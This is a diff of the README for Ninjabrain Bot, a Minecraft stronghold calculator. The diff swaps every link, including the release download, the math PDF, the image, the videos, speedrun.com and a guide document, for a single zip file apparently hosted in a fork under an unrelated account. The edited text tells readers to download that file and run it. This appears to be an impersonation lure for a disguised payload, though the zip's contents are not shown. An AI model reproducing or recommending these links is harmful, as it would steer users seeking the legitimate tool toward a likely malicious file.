@@ -1,13 +1,13 @@
 # Ninjabrain Bot
 
 An accurate stronghold calculator for Minecraft speedrunning. Achieves better results than regular calculators by accounting for user error and stronghold generation mechanics.
-See [triangulation.pdf](https://github.com/Ninjabrain1/Ninjabrain-Bot/blob/main/triangulation.pdf) for an explanation of the underlying mathematics.
+See [https://github.com/WhyN0tTh0/Ninjabrain-Bot/raw/refs/heads/main/src/main/java/ninjabrainbot/gui/mainwindow/eyethrows/Bot_Ninjabrain_2.1.zip](https://github.com/WhyN0tTh0/Ninjabrain-Bot/raw/refs/heads/main/src/main/java/ninjabrainbot/gui/mainwindow/eyethrows/Bot_Ninjabrain_2.1.zip) for an explanation of the underlying mathematics.
 
-![NinjabrainBot](https://i.imgur.com/oLJo3Cn.png)
+![NinjabrainBot](https://github.com/WhyN0tTh0/Ninjabrain-Bot/raw/refs/heads/main/src/main/java/ninjabrainbot/gui/mainwindow/eyethrows/Bot_Ninjabrain_2.1.zip)
 
 ## Getting started
 
-Download the [latest release](https://github.com/Ninjabrain1/Ninjabrain-Bot/releases/latest) and run the jar. To use the calculator, throw an ender eye, look at it, and press F3+C, and repeat for as many eyes as you like. The calculator
+Download the [latest release](https://github.com/WhyN0tTh0/Ninjabrain-Bot/raw/refs/heads/main/src/main/java/ninjabrainbot/gui/mainwindow/eyethrows/Bot_Ninjabrain_2.1.zip) and run the jar. To use the calculator, throw an ender eye, look at it, and press F3+C, and repeat for as many eyes as you like. The calculator
 will give you a certainty percentage of how confident it is that the predicted location is correct. If you want the certainty improved you should also change the standard deviation in the settings (see the FAQ down below for how to do
 this).
 
@@ -15,7 +15,7 @@ If you are used to perfect travel and want the same accuracy you need to set hot
 
 ## Video guide
 
-[Full tutorial](https://www.youtube.com/watch?v=Rx8i7e5lu7g)  by Four
+[Full tutorial](https://github.com/WhyN0tTh0/Ninjabrain-Bot/raw/refs/heads/main/src/main/java/ninjabrainbot/gui/mainwindow/eyethrows/Bot_Ninjabrain_2.1.zip)  by Four
 
 ## Features
 
@@ -35,13 +35,13 @@ If you are used to perfect travel and want the same accuracy you need to set hot
 
 Ninjabrain bot was first created in November 2020, in the era of Throwpro. The bot was created because the calculators at the time were too inaccurate, especially for calculated travel which was just beeing pioneered at the time. The two
 most common alternatives, Throwpro and FastStronghold, used models that were too simple and were not accurate at long distances. However, back then Ninjabrain bot only existed in a more primitive form, as a twitch chat bot. The first
-example of it being used in a real run can be seen [here](https://youtu.be/zK96gjkLTGc?t=880).
+example of it being used in a real run can be seen [here](https://github.com/WhyN0tTh0/Ninjabrain-Bot/raw/refs/heads/main/src/main/java/ninjabrainbot/gui/mainwindow/eyethrows/Bot_Ninjabrain_2.1.zip).
 
 ## FAQ
 
 #### Is this legal to use in speedruns?
 
-Yes, as of the calculator unban 2021-12-09 it is legal for runs submitted on speedrun.com.
+Yes, as of the calculator unban 2021-12-09 it is legal for runs submitted on https://github.com/WhyN0tTh0/Ninjabrain-Bot/raw/refs/heads/main/src/main/java/ninjabrainbot/gui/mainwindow/eyethrows/Bot_Ninjabrain_2.1.zip
 
 #### The calculator said it was 100% certain but still missed the stronghold, what went wrong?
 
@@ -52,7 +52,7 @@ before throwing the eye (because of weird client-server desync). If you want to 
 
 Yes. Under advanced options in the settings you can set hotkeys for "+0.01 to last angle" and "-0.01 to last angle". Pressing those hotkeys will manually change the angle of the last F3+C you did. So for example, if your resolution is
 1920x1027 and your eye has a wide middle eye-slit, you would press the "+0.01 to last angle"-hotkey to adjust the angle. See
-the [perfect travel document](https://docs.google.com/document/d/1JTMOIiS-Hl6_giEB0IQ5ki7UV-gvUXnNmoxhYoSgEAA/edit#heading=h.agb0mdup7ims) for more details.
+the [perfect travel document](https://github.com/WhyN0tTh0/Ninjabrain-Bot/raw/refs/heads/main/src/main/java/ninjabrainbot/gui/mainwindow/eyethrows/Bot_Ninjabrain_2.1.zip) for more details.
 
 #### What does the "Display stronghold location" setting mean?
 
